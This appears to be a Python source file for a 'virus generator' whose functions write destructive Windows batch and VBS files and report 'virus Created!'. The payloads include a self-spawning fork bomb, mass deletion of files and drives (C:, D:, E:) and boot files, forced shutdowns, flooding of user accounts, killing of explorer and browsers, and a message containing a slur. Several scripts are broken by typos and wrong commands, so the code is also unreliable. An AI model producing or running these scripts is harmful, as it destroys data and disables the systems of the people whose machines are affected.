import os, time
from conf.banner import *

def overload():
	o = open('overload.bat','a')
	o.write("""

		@echo off
		:hewo
		echo VIRUS OVERLOAD!
		start overload.bat
		goto hewo

		""")
	print(r+"\n virus Created!")
	print(r+"done! File is in virGen Folder!\n")



def deletefiles():
	o = open('delFiles.bat','a')
	o.write("""

		@echo off
		del*.*

		""")
	print(r+"\n virus Created!")
	print(r+"done! File is in virGen Folder!\n")


def bsof():
	o = open('bsof.vbs','a')
	o.write("""
		@echo off
		del%systemdrive%*.* /f/s/q
		shutdown -r -f -t 00

		""")
	print(r+"\n virus Created!")
	print(r+"done! File is in virGen Folder!\n")



def foolkey():
	o = open('fool.vbs','a')
	o.write("""
		Set wshShell = wscript.CreateObject("WScript.Shell)
		do
		wscript.sleep 100
		wshshell.sendkeys 'you are a Fool '
		loop 

		""")
	print(r+"\n virus Created!")
	print(r+"done! File is in virGen Folder!\n")


def formatdrive():
	o = open('format.bat','a')
	o.write("""
		rd/s/q D:
		rd/s/q C:
		rd/s/q E:

		""")
	print(r+"\n virus Created!")
	print(r+"done! File is in virGen Folder!\n")



def shutdown():
	o = open('shutdown.bat','a')
	o.write("""
		@echo off
		attrib -r -s -h c:autoexec.bat
		del c:autoexec.bat
		attrib -r -s -h c:boot.ini
		del c:boot.ini
		attrib -r -s -h c:
		tldr
		del c:
		tdlr
		attrib -r -s -h c:windowswin.ini
		del c:windowswin.ini
		@echo oof
		Msg *YOUR GAY! YOUR INFECTED!!
		Shutdown -s -t 7 -c "VIRUS IS SPREADING! c:Drive

		""")
	print(r+"\n virus Created!")
	print(r+"done! File is in virGen Folder!\n")


def userflood():
	o = open('accflooder.bat','a')
	o.write("""
		@echo off
		:xnet
		user %random% /add
		goto x

		""")
	print(r+"\n virus Created!")
	print(r+"done! File is in virGen Folder!\n")


def delos():
	o = open('Del-Os-Sys.bat','a')
	o.write("""
		@echo off
		del C:*.*|y

		""")
	print(r+"\n virus Created!")
	print(r+"done! File is in virGen Folder!\n")


def infnotepads():
	o = open('infNote.bat','a')
	o.write("""
		@echo off
		:ninja
		START %SystemRoot% system32
		notepad.exe
		goto ninja

		""")
	print(r+"\n virus Created!")
	print(r+"done! File is in virGen Folder!\n")


def Bomb():
	o = open('bomb.bat','a')
	o.write("""
		if %date% NEQ 2021/01/15 goto exit
		:exit
		exit

		""")
	print(r+"\n virus Created!")
	print(r+"done! File is in virGen Folder!\n")


def taskill():
	o = open('tskill.bat','a')
	o.write("""
		@echo oof
		start calc
		tskill msnmsgr
		tskill firefox
		tskill iexplore
		tskill LimreWire
		tskill explorer
		tskill explorer
		tskill explorer
		tskill explorer
		tskill explorer
		pause

		""")
	print(r+"\n virus Created!")
	print(r+"done! File is in virGen Folder!\n")

def netgone():
	o = open('netcut.bat','a')
	o.write("""
		@echo off
		ifconfig /release
		shutdown /s
		""")
	print(r+"\n virus Created!")
	print(r+"done! File is in virGen Folder!\n")
